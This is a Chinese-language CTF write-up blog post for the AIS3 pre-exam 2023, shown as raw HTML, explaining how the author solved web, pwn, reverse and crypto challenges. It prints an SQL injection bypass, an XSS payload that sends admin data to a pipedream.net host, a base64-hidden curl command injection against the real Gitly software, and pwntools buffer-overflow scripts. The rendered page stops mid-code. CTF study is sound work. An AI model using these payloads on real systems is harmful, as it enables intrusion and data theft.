<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>AIS3 pre-exam 2023 Writeup | Vincent55's Blog</title><meta name=keywords content="CTF,AIS3"><meta name=description content="AIS3 preexam 2023 的 writeup"><meta name=author content="Vincent55"><link rel=canonical href=https://blog.vincent55.tw/posts/ais3preexam2023/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.f31506494d50c1e73c10e63d252a2d8a2cb329e28c1402c71fee0d3145ad3685.css integrity="sha256-8xUGSU1Qwec8EOY9JSotiiyzKeKMFALHH+4NMUWtNoU=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad();></script><link rel=icon href=https://i.imgur.com/zPuyQD5.jpg><link rel=icon type=image/png sizes=16x16 href=https://i.imgur.com/zPuyQD5.jpg><link rel=icon type=image/png sizes=32x32 href=https://i.imgur.com/zPuyQD5.jpg><link rel=apple-touch-icon href=https://i.imgur.com/zPuyQD5.jpg><link rel=mask-icon href=https://i.imgur.com/zPuyQD5.jpg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><script type=text/javascript>(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window,document,"clarity","script","nzfk9jeibm");</script><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme: rgb(29, 30, 32);--entry: rgb(46, 46, 51);--primary: rgb(218, 218, 219);--secondary: rgb(155, 156, 157);--tertiary: rgb(65, 66, 68);--content: rgb(196, 196, 197);--hljs-bg: rgb(46, 46, 51);--code-bg: rgb(55, 56, 62);--border: rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');ga('create','G-C801TEY2ER','auto');ga('send','pageview');}</script><meta property="og:title" content="AIS3 pre-exam 2023 Writeup"><meta property="og:description" content="AIS3 preexam 2023 的 writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.vincent55.tw/posts/ais3preexam2023/"><meta property="og:image" content="https://i.imgur.com/WNqYHa4.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-06-24T00:00:00+00:00"><meta property="article:modified_time" content="2023-06-24T00:00:00+00:00"><meta property="og:site_name" content="Vincent55's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://i.imgur.com/WNqYHa4.png"><meta name=twitter:title content="AIS3 pre-exam 2023 Writeup"><meta name=twitter:description content="AIS3 preexam 2023 的 writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"AIS3 pre-exam 2023 Writeup","item":"https://blog.vincent55.tw/posts/ais3preexam2023/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"AIS3 pre-exam 2023 Writeup","name":"AIS3 pre-exam 2023 Writeup","description":"AIS3 preexam 2023 的 writeup","keywords":["CTF","AIS3"],"articleBody":"前言 這次打了個第 8 名，但這次暑假有事情了，不能去 qq。\nWeb Login Panel app.post(\"/login\", recaptcha.middleware.verify, (req, res) = { const { username, password } = req.body; db.get( `SELECT * FROM Users WHERE username = '${username}' AND password = '${password}'`, async (err, row) = { if (err) return res.redirect(`https://www.youtube.com/watch?v=dQw4w9WgXcQ`); if (!row) return res.redirect(`/login?msg=invalid_credentials`); if (row.username !== username) { // special case  return res.redirect(`https://www.youtube.com/watch?v=E6jbBLrxY1U`); } if (req.recaptcha.error) { console.log(req.recaptcha.error); return res.redirect(`/login?msg=invalid_captcha`); } req.session.username = username; return res.redirect(\"/2fa\"); } ); }); 觀察這個 API 可以看到有個明顯的 SQLi，可以使用 admin ' OR 1=1;--  登入\n之後發現 /dashboard 不用經過 2fa 驗證，所以直接去存取即可拿到 flag AIS3{' UNION SELECT 1, 1, 1, 1 WHERE ({condition})--}\nE-Portfolio baby 用任意帳號登入後，經過測試發現可以用以下 XSS payload \n接下來發現 nonce 並沒有成功設定，以及 flag 是 admin 的密碼，所以我發現了 /api/portfolio 的內容會回傳 admin 的所有資訊，下一步就會讓 admin 去存取他，並將結果回傳回來\n這個是最終 payload\nres.text()).then(res=fetch(\"https://eoudzw9ph3hhnmh.m.pipedream.net?ouo=\"+btoa(res)))' nonce=\"\" AIS3{，，markToFiles 首先發現 pandoc 的這個參數可以自動 contain 本地的資源，但這個 deprecated 了，於是往下看到 –embed-resourse 跟 –standalone 透過看 文件 發現 –standalone 在 pdf, epub, epub3, fb2, docx, and odt 為 output format 時會自動開啟。\n因此使用以下 payload 即可自動 contain 到本地的檔案\nAIS3{R3@d1ng_D0cum3nt_1s_H31pfu1}\nGitly 這題是一個用 Vlang 撰寫的 GitHub/GitLab alternative Gitly，題目要我們找 zero day，又說預期解是 RCE，因此起手式就是把檔案 clone 下來後搜尋 os.execute\n接下來一個一個看有沒有可以 preauth 又可以達到 command inject 的地方\n於是發現了這個 function 看起來很多洞\nfn (r \u0026Repo) git(command string) string { if command.contains('\u0026') || command.contains(';') { return '' } command_with_path := '-C ${r.git_dir} ${command}' command_result := os.execute('git ${command_with_path}') command_exit_code := command_result.exit_code if command_exit_code != 0 { println('git error ${command_with_path} with ${command_exit_code} exit code out=${command_result.output}') return '' } return command_result.output.trim_space() } 接下來看有哪些 route 使用了這個 function ，去搜尋 .git(\n發現這個 function 看起來有料，只要透過 path 就可以碰到上述的 function\n['/:user/:repository/raw/:branch_name/:path...'] pub fn (mut app App) handle_raw(username string, repo_name string, branch_name string, path string) vweb.Result { user := app.get_user_by_username(username) or { return app.not_found() } repo := app.find_repo_by_name_and_user_id(repo_name, user.id) if repo.id == 0 { return app.not_found() } // TODO: throw error when git returns non-zero status file_source := repo.git('--no-pager show ${branch_name}:${path}') return app.ok(file_source) } 接下來構造 payload，因為 git function 有檔 ; \u0026，但這個非常好繞，使用 base64 即可\n`echo Y3VybCBodHRwczovL2VvdWR6dzlwaDNoaG5taC5tLnBpcGVkcmVhbS5uZXQ/b3VvPWAvcmVhZGZsYWdg | base64 -d | sh` 最終 payload http://chals1.ais3.org:25565/admin/gitly/raw/master/%60echo%20Y3VybCBodHRwczovL2VvdWR6dzlwaDNoaG5taC5tLnBpcGVkcmVhbS5uZXQ/b3VvPWAvcmVhZGZsYWdg%20%7C%20base64%20-d%20%7C%20sh%60\nAIS3{so_many_bugs_so_easy_to_rce}\nPwn Simply Pwn 就是一個非常單純的 BOF\nfrom pwn import * #r = process(\"./pwn\") r = remote(\"chals1.ais3.org\", 11111) r.recvuntil(b\": \") payload = b\"A\"*79+p64(0x4017a9) raw_input() r.sendline(payload) raw_input() r.interactive() AIS3{5imP1e_Pwn_4_beGinn3rs!}\nManagementSystem 題目是一個 linked list 去實作儲存使用者資訊\n研究了一下後發現刪除的地方是使用 gets ，因此可能有安全上的問題\nUser *delete_user(User *head) { printf(\"Enter the index of the user you want to delete: \"); char buffer[64]; gets(buffer); int user_index; sscanf(buffer, \"%d\", \u0026user_index); if (user_index  0) { printf(\"Invalid index.\\n\"); return head; } if (user_index == 1) { User *user_to_delete = head; head = head-next; free(user_to_delete); return head; } User *previous = head; User *current = head-next; int count = 2; while (current != NULL) { if (count == user_index) { previous-next = current-next; free(current); return head; } previous = current; current = current-next; count++; } printf(\"User not found.\\n\"); return head; } 但全部蓋掉會 crash，因為下面還需要 stack 上的資訊，所以我們除了控制 return address ，還需要控制程式執行邏輯\n在這個例子裡面，我們可以透過讓 user_index 小於 0，來讓程式提早結束，跳到我們想要的 address，避免存取到壞掉的 stack，導致 crash。\n以下是 payload\nfrom pwn import * #r = process(\"./share/ms\") r = remote(\"chals1.ais3.org\", 10003) r.recvuntil(b\" \") r.sendline(b\"3\") r.recvuntil(b\": \") payload = p64(0x312d)+b\"A\"*8*12+p64(0x40131b) #payload = b\"-1\" raw_input() r.sendline(payload) raw_input() r.interactive() FLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}\nReverse Simply Reverse 丟到 ida64 後發現主要的 function 可以寫對應的程式解出 flag\n#include  using namespace std; int main() { int enc[] = {138, 80, 146, 200, 6, 61, 91, 149, 182, 82, 27, 53, 130, 90, 234, 248, 148, 40, 114, 221, 212, 93, 227, 41, 186, 88, 82, 168, 100, 53, 129, 172, 10, 100, 0}; for(int i = 0; i((i ^ 9) \u0026 3)|enc[i]AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}\nFlag Sleeper 觀察到關鍵函式有三個陣列叫 a b c 可以先將 b c xor 起來後，再透過 a 來把 flag 順序排好，以下是排好的 function\n#include using namespace std; int main() { // srand(3158064);  // int vis[58] = {0};  // int cnt =0;  // while(cnt // int now = rand()%52;  // if(!vis[now])  // cnt++;  // ++vis[now]  // }  // return 0;  string mas_flag = \"91p4h_g_3ghet8_14cl3kf_{15u1ar1A033racSm7I}_c_s?f8lJ\"; int rep[] = {10,12,28,7,38,31,47,44,42,35,48,30,21,11,17,16,34,40,33,39,41,9,22,4,6,20,19,46,23,45,26,0,15,3,8,43,14,5,2,27,49,1,51,36,37,24,25,50,32,13,29,18}; string flag = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"; for(int i = 0; i54; i++){ flag[rep[i]] = mas_flag[i]; } cout  flag; } AIS3{c143f9818a01_Ju5t_a_s1mple_fl4g_ch3ck3r_r1gh7?}\nVivid Emotion _ 發現是一個解方程式的題目，先用 ida 把 C code 匯出。 接下來把每個算式用 regex 拆出來，再生成 z3 solver 的 code，執行即可解題\nhttps://pornhub.mov/ouo.html\nMisc robots from pwn import * #connect to server r = remote('chals1.ais3.org', 12348) # remote binary r.recvline() r.recvline() from time import sleep for _ in range(30): res = r.recvline() ans = str(eval(res)) print(res, ans) r.sendline(ans) sleep(0.5) r.interactive() #switch to interactive mode Crypto Fernet from cryptography.fernet import Fernet import os import base64 from Crypto.Hash import SHA256 from Crypto.Protocol.KDF import PBKDF2 leak_password = 'mysecretpassword' flag = base64.b64decode('iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj') salt = flag[:16] flag = flag[16:] key = PBKDF2(leak_password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256) f = Fernet(base64.urlsafe_b64encode(key)) plain = f.decrypt(flag) print(plain) ","wordCount":"742","inLanguage":"en","image":"https://i.imgur.com/WNqYHa4.png","datePublished":"2023-06-24T00:00:00Z","dateModified":"2023-06-24T00:00:00Z","author":{"@type":"Person","name":"Vincent55"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.vincent55.tw/posts/ais3preexam2023/"},"publisher":{"@type":"Organization","name":"Vincent55's Blog","logo":{"@type":"ImageObject","url":"https://i.imgur.com/zPuyQD5.jpg"}}}</script></head><body id=top><script>if(localStorage.getItem("pref-theme")==="dark"){document.body.classList.add('dark');}else if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}else if(window.matchMedia('(prefers-color-scheme: dark)').matches){document.body.classList.add('dark');}</script><header class=header><nav class=nav><div class=logo><a href=https://blog.vincent55.tw/ accesskey=h title="Vincent55's Blog (Alt + H)">Vincent55's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.vincent55.tw/about/ title=about><span>about</span></a></li><li><a href=https://blog.vincent55.tw/posts/ title=posts><span>posts</span></a></li><li><a href=https://blog.vincent55.tw/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.vincent55.tw/>Home</a></div><h1 class=post-title>AIS3 pre-exam 2023 Writeup</h1><div class=post-description>AIS3 preexam 2023 的 writeup</div><div class=post-meta><span title="2023-06-24 00:00:00 +0000 UTC">June 24, 2023</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;Vincent55</div></header><figure class=entry-cover><img loading=lazy src=https://i.imgur.com/WNqYHa4.png alt=AIS3preexam2023writeup><p>scoreboard</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#前言>前言</a></li><li><a href=#web>Web</a><ul><li><a href=#login-panel>Login Panel</a></li><li><a href=#e-portfolio-baby>E-Portfolio baby</a></li><li><a href=#marktofiles>markToFiles</a></li><li><a href=#gitly>Gitly</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#simply-pwn>Simply Pwn</a></li><li><a href=#managementsystem>ManagementSystem</a></li></ul></li><li><a href=#reverse>Reverse</a><ul><li><a href=#simply-reverse>Simply Reverse</a></li><li><a href=#flag-sleeper>Flag Sleeper</a></li><li><a href=#vivid-emotion-_b>Vivid Emotion <code>>_&lt;b</code></a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#robots>robots</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#fernet>Fernet</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=前言>前言<a hidden class=anchor aria-hidden=true href=#前言>#</a></h2><p>這次打了個第 8 名，但這次暑假有事情了，不能去 qq。</p><h2 id=web>Web<a hidden class=anchor aria-hidden=true href=#web>#</a></h2><h3 id=login-panel>Login Panel<a hidden class=anchor aria-hidden=true href=#login-panel>#</a></h3><div class=highlight><pre class=chroma><code class=language-js data-lang=js><span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s2>&#34;/login&#34;</span><span class=p>,</span> <span class=nx>recaptcha</span><span class=p>.</span><span class=nx>middleware</span><span class=p>.</span><span class=nx>verify</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=kr>const</span> <span class=p>{</span> <span class=nx>username</span><span class=p>,</span> <span class=nx>password</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>;</span>
  <span class=nx>db</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span>
    <span class=sb>`SELECT * FROM Users WHERE username = &#39;</span><span class=si>${</span><span class=nx>username</span><span class=si>}</span><span class=sb>&#39; AND password = &#39;</span><span class=si>${</span><span class=nx>password</span><span class=si>}</span><span class=sb>&#39;`</span><span class=p>,</span>
    <span class=nx>async</span> <span class=p>(</span><span class=nx>err</span><span class=p>,</span> <span class=nx>row</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span>
        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=sb>`https://www.youtube.com/watch?v=dQw4w9WgXcQ`</span><span class=p>);</span>
      <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>row</span><span class=p>)</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=sb>`/login?msg=invalid_credentials`</span><span class=p>);</span>
      <span class=k>if</span> <span class=p>(</span><span class=nx>row</span><span class=p>.</span><span class=nx>username</span> <span class=o>!==</span> <span class=nx>username</span><span class=p>)</span> <span class=p>{</span>
        <span class=c1>// special case
</span><span class=c1></span>        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=sb>`https://www.youtube.com/watch?v=E6jbBLrxY1U`</span><span class=p>);</span>
      <span class=p>}</span>
      <span class=k>if</span> <span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>recaptcha</span><span class=p>.</span><span class=nx>error</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>recaptcha</span><span class=p>.</span><span class=nx>error</span><span class=p>);</span>
        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=sb>`/login?msg=invalid_captcha`</span><span class=p>);</span>
      <span class=p>}</span>
      <span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>.</span><span class=nx>username</span> <span class=o>=</span> <span class=nx>username</span><span class=p>;</span>
      <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s2>&#34;/2fa&#34;</span><span class=p>);</span>
    <span class=p>}</span>
  <span class=p>);</span>
<span class=p>});</span>
</code></pre></div><p>觀察這個 API 可以看到有個明顯的 SQLi，可以使用 <code>admin</code> <code>' OR 1=1;--</code> 登入</p><p>之後發現 /dashboard 不用經過 2fa 驗證，所以直接去存取即可拿到 flag
<code>AIS3{' UNION SELECT 1, 1, 1, 1 WHERE ({condition})--}</code></p><h3 id=e-portfolio-baby>E-Portfolio baby<a hidden class=anchor aria-hidden=true href=#e-portfolio-baby>#</a></h3><p>用任意帳號登入後，經過測試發現可以用以下 XSS payload
<code>&lt;svg>&lt;svg/onload=alert(1)></code></p><p>接下來發現 nonce 並沒有成功設定，以及 flag 是 admin 的密碼，所以我發現了 <code>/api/portfolio</code> 的內容會回傳 admin 的所有資訊，下一步就會讓 admin 去存取他，並將結果回傳回來</p><p>這個是最終 payload</p><pre><code class="language-htmlembedded=" data-lang="htmlembedded=">&lt;svg&gt;&lt;svg/onload='fetch(&quot;/api/portfolio&quot;).then(res=&gt;res.text()).then(res=&gt;fetch(&quot;https://eoudzw9ph3hhnmh.m.pipedream.net?ouo=&quot;+btoa(res)))' nonce=&quot;&quot;&gt;
</code></pre><p><code>AIS3{，，&lt;img src=x onerror='fetch(...}</code></p><h3 id=marktofiles>markToFiles<a hidden class=anchor aria-hidden=true href=#marktofiles>#</a></h3><p>首先發現 pandoc 的這個參數可以自動 contain 本地的資源，但這個 deprecated 了，於是往下看到 &ndash;embed-resourse 跟 &ndash;standalone
<img loading=lazy src=https://hackmd.io/_uploads/Syp6dv1Hn.png alt></p><p>透過看 <a href=https://pandoc.org/MANUAL.html#general-writer-options>文件</a> 發現 &ndash;standalone 在 pdf, epub, epub3, fb2, docx, and odt 為 output format 時會自動開啟。</p><p><img loading=lazy src=https://hackmd.io/_uploads/r1Mo_PyB2.png alt></p><p>因此使用以下 payload 即可自動 contain 到本地的檔案</p><p><img loading=lazy src=https://hackmd.io/_uploads/H1kPuDJH3.png alt></p><p><code>AIS3{R3@d1ng_D0cum3nt_1s_H31pfu1}</code></p><h3 id=gitly>Gitly<a hidden class=anchor aria-hidden=true href=#gitly>#</a></h3><p>這題是一個用 Vlang 撰寫的 GitHub/GitLab alternative <a href=https://github.com/vlang/gitly>Gitly</a>，題目要我們找 zero day，又說預期解是 RCE，因此起手式就是把檔案 clone 下來後搜尋 os.execute</p><p><img loading=lazy src=https://hackmd.io/_uploads/BJpzcD1S2.png alt></p><p>接下來一個一個看有沒有可以 preauth 又可以達到 command inject 的地方</p><p>於是發現了這個 function 看起來很多洞</p><pre><code>fn (r &amp;Repo) git(command string) string {
	if command.contains('&amp;') || command.contains(';') {
		return ''
	}

	command_with_path := '-C ${r.git_dir} ${command}'

	command_result := os.execute('git ${command_with_path}')
	command_exit_code := command_result.exit_code
	if command_exit_code != 0 {
		println('git error ${command_with_path} with ${command_exit_code} exit code out=${command_result.output}')

		return ''
	}

	return command_result.output.trim_space()
}
</code></pre><p>接下來看有哪些 route 使用了這個 function ，去搜尋 .git(</p><p><img loading=lazy src=https://hackmd.io/_uploads/ryc59PJHn.png alt></p><p>發現這個 function 看起來有料，只要透過 path 就可以碰到上述的 function</p><pre><code>['/:user/:repository/raw/:branch_name/:path...']
pub fn (mut app App) handle_raw(username string, repo_name string, branch_name string, path string) vweb.Result {
	user := app.get_user_by_username(username) or { return app.not_found() }
	repo := app.find_repo_by_name_and_user_id(repo_name, user.id)

	if repo.id == 0 {
		return app.not_found()
	}

	// TODO: throw error when git returns non-zero status
	file_source := repo.git('--no-pager show ${branch_name}:${path}')

	return app.ok(file_source)
}
</code></pre><p>接下來構造 payload，因為 git function 有檔 <code>;</code> <code>&</code>，但這個非常好繞，使用 base64 即可</p><div class=highlight><pre class=chroma><code class=language-sh data-lang=sh><span class=sb>`</span><span class=nb>echo</span> Y3VybCBodHRwczovL2VvdWR6dzlwaDNoaG5taC5tLnBpcGVkcmVhbS5uZXQ/b3VvPWAvcmVhZGZsYWdg <span class=p>|</span> base64 -d <span class=p>|</span> sh<span class=sb>`</span>
</code></pre></div><p>最終 payload
<code>http://chals1.ais3.org:25565/admin/gitly/raw/master/%60echo%20Y3VybCBodHRwczovL2VvdWR6dzlwaDNoaG5taC5tLnBpcGVkcmVhbS5uZXQ/b3VvPWAvcmVhZGZsYWdg%20%7C%20base64%20-d%20%7C%20sh%60</code></p><p><code>AIS3{so_many_bugs_so_easy_to_rce}</code></p><h2 id=pwn>Pwn<a hidden class=anchor aria-hidden=true href=#pwn>#</a></h2><h3 id=simply-pwn>Simply Pwn<a hidden class=anchor aria-hidden=true href=#simply-pwn>#</a></h3><p>就是一個非常單純的 BOF</p><pre><code class="language-python=" data-lang="python=">from pwn import *

#r = process(&quot;./pwn&quot;)
r = remote(&quot;chals1.ais3.org&quot;, 11111)
r.recvuntil(b&quot;: &quot;)
payload = b&quot;A&quot;*79+p64(0x4017a9)
raw_input()
r.sendline(payload)
raw_input()
r.interactive()
</code></pre><p><code>AIS3{5imP1e_Pwn_4_beGinn3rs!}</code></p><h3 id=managementsystem>ManagementSystem<a hidden class=anchor aria-hidden=true href=#managementsystem>#</a></h3><p>題目是一個 linked list 去實作儲存使用者資訊</p><p>研究了一下後發現刪除的地方是使用 gets ，因此可能有安全上的問題</p><div class=highlight><pre class=chroma><code class=language-c data-lang=c><span class=n>User</span> <span class=o>*</span><span class=nf>delete_user</span><span class=p>(</span><span class=n>User</span> <span class=o>*</span><span class=n>head</span><span class=p>)</span> <span class=p>{</span>
    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Enter the index of the user you want to delete: &#34;</span><span class=p>);</span>
    <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>
    <span class=n>gets</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>

    <span class=kt>int</span> <span class=n>user_index</span><span class=p>;</span>
    <span class=n>sscanf</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>user_index</span><span class=p>);</span>

    <span class=k>if</span> <span class=p>(</span><span class=n>user_index</span> <span class=o>&lt;=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Invalid index.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
        <span class=k>return</span> <span class=n>head</span><span class=p>;</span>
    <span class=p>}</span>

    <span class=k>if</span> <span class=p>(</span><span class=n>user_index</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
        <span class=n>User</span> <span class=o>*</span><span class=n>user_to_delete</span> <span class=o>=</span> <span class=n>head</span><span class=p>;</span>
        <span class=n>head</span> <span class=o>=</span> <span class=n>head</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>;</span>
        <span class=n>free</span><span class=p>(</span><span class=n>user_to_delete</span><span class=p>);</span>
        <span class=k>return</span> <span class=n>head</span><span class=p>;</span>
    <span class=p>}</span>

    <span class=n>User</span> <span class=o>*</span><span class=n>previous</span> <span class=o>=</span> <span class=n>head</span><span class=p>;</span>
    <span class=n>User</span> <span class=o>*</span><span class=n>current</span> <span class=o>=</span> <span class=n>head</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>;</span>
    <span class=kt>int</span> <span class=n>count</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>

    <span class=k>while</span> <span class=p>(</span><span class=n>current</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>count</span> <span class=o>==</span> <span class=n>user_index</span><span class=p>)</span> <span class=p>{</span>
            <span class=n>previous</span><span class=o>-&gt;</span><span class=n>next</span> <span class=o>=</span> <span class=n>current</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>;</span>
            <span class=n>free</span><span class=p>(</span><span class=n>current</span><span class=p>);</span>
            <span class=k>return</span> <span class=n>head</span><span class=p>;</span>
        <span class=p>}</span>

        <span class=n>previous</span> <span class=o>=</span> <span class=n>current</span><span class=p>;</span>
        <span class=n>current</span> <span class=o>=</span> <span class=n>current</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>;</span>
        <span class=n>count</span><span class=o>++</span><span class=p>;</span>
    <span class=p>}</span>

    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;User not found.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
    <span class=k>return</span> <span class=n>head</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div><p>但全部蓋掉會 crash，因為下面還需要 stack 上的資訊，所以我們除了控制 return address ，還需要控制程式執行邏輯</p><p>在這個例子裡面，我們可以透過讓 user_index 小於 0，來讓程式提早結束，跳到我們想要的 address，避免存取到壞掉的 stack，導致 crash。</p><p>以下是 payload</p><pre><code class="language-python=" data-lang="python=">from pwn import *

#r = process(&quot;./share/ms&quot;)
r = remote(&quot;chals1.ais3.org&quot;, 10003)
r.recvuntil(b&quot;&gt; &quot;)
r.sendline(b&quot;3&quot;)
r.recvuntil(b&quot;: &quot;)

payload = p64(0x312d)+b&quot;A&quot;*8*12+p64(0x40131b)
#payload = b&quot;-1&quot;
raw_input()
r.sendline(payload)
raw_input()
r.interactive()
</code></pre><p><code>FLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}</code></p><h2 id=reverse>Reverse<a hidden class=anchor aria-hidden=true href=#reverse>#</a></h2><h3 id=simply-reverse>Simply Reverse<a hidden class=anchor aria-hidden=true href=#simply-reverse>#</a></h3><p>丟到 ida64 後發現主要的 function
<img loading=lazy src=https://hackmd.io/_uploads/ryG86vJH2.png alt></p><p>可以寫對應的程式解出 flag</p><pre><code>#include &lt;iostream&gt;

using namespace std;

int main()
{
    int enc[] = {138, 80, 146, 200, 6, 61, 91, 149, 182, 82, 27, 53, 130, 90, 234, 248, 148, 40, 114, 221, 212, 93, 227, 41, 186, 88, 82, 168, 100, 53, 129, 172, 10, 100, 0};

    for(int i = 0; i&lt;35; i++){
        enc[i]-=8;
        cout &lt;&lt; (((enc[i]&gt;&gt;((i ^ 9) &amp; 3)|enc[i]&lt;&lt;(8 - ((i ^ 9) &amp; 3)))) &amp; 255 ^i)&lt;&lt; &quot; &quot;;

    }
}
</code></pre><p><code>AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}</code></p><h3 id=flag-sleeper>Flag Sleeper<a hidden class=anchor aria-hidden=true href=#flag-sleeper>#</a></h3><p>觀察到關鍵函式有三個陣列叫 a b c
<img loading=lazy src=https://hackmd.io/_uploads/rk9oRDyr2.png alt></p><p>可以先將 b c xor 起來後，再透過 a 來把 flag 順序排好，以下是排好的 function</p><div class=highlight><pre class=chroma><code class=language-c++ data-lang=c++><span class=cp>#include</span><span class=cpf>&lt;bits/stdc++.h&gt;</span><span class=cp>
</span><span class=cp></span>

